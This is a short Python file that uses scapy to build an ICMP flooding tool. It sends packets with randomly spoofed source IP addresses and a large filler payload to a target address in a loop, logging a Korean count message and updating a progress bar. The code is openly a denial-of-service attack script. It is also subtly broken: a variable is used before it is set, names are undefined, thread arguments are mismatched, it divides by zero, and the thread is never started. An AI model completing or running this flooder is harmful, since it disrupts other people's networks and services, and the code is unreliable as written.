import string
from threading import Thread
from scapy.all import *


class Icmp:
    def __init__(self, dst):
        self.thread = None
        self.dst_IP = dst
        self.running = True
        self.intercount = 0
        self.is_running = False
        self.icmpf = IP(src=RandIP(), dst=self.dst_IP, ttl=20) / ICMP() / self.data
        self.data = (string.ascii_letters + string.digits) * 600
        self.res = str(self.data.encode('utf8'))
    
    def run(self, log_f, p_bar):
        send(self.icmpf, verbose=False)
        log_f(f"{self.intercount}개의 패킷을 전송했습니다")
        p_bar.setProperty("value", limit // self.intercount)
        self.intercount += 1
    
    def threadf(self, log_f, p_bar, limit):
        while self.is_running:
            self.run(log_f, p_bar)
            if self.intercount > limit:
                return
    
    def start(self, log_f, p_bar, limit):
        self.is_running = True
        self.thread = Thread(target=self.threadf, args=[log_f, p_bar])
